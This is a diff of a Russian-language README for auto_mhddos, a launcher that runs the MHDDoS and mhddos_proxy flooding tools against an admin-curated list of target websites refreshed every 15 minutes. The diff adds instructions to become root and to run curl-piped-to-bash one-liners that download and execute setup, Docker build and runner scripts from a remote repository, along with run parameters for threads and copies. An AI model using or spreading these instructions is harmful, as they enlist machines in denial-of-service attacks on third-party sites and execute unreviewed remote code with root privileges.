@@ -2,6 +2,27 @@
 
 Перед запуском перейти под пользователя root. Для этого выполнить команду `sudo su`
 
+## Установка или получение обновлений
+
+* Выполняем команду `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/setup.sh | bash`
+
+* Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.
+
+## Запуск скрипта
+
+### Docker
+
+1. Билдим образ командой `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/build_docker.sh | bash`
+2. Запускаем `docker run -it --rm aruiem234/auto_mhddos:latest`
+
+Опционально можно указать параметры:
+
+```shell
+docker run -it --rm aruiem234/auto_mhddos:latest [num_of_copies] [restart_interval] [threads] [rpc]
+```
+
+### Bash
+
 * Запускается одной командой (one-liner) в Linux і WSL (Windows Subsystem for Linux). Дальнейшее вмешательство со стороны пользователя не обязательно. `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash`
 
 #
@@ -24,10 +45,6 @@
 100 - параметр --rpc в mhddos_proxy.
 #
 
-* Скрипт автоматически устанавливается git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.
-
-* При ручном перезапуске скрипт автоматически обновляет mhddos_proxy і MHDDoS.
-
 * Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).
 
 * База целей обновляется скриптом каждые 15 мин.
@@ -42,4 +59,10 @@
 
 Рекомендуется использовать на Ubuntu 20.04. Вероятно будет работать на всех Ubuntu начиная с 18.04, а также всех производных Ubuntu и WSL2.
 
-Чтобы завершить скрипт. Простой закройте окно с терминало. ИЛИ. В другом терминале выполните команду "pkill -f python3", потом в основном терминале нажмите CTRL + C.
+## Завершение скрипта
+
+Чтобы завершить скрипт, простой закройте окно с терминалом
+
+ИЛИ
+
+В другом терминале выполните команду "pkill -f python3", потом в основном терминале нажмите CTRL + C.
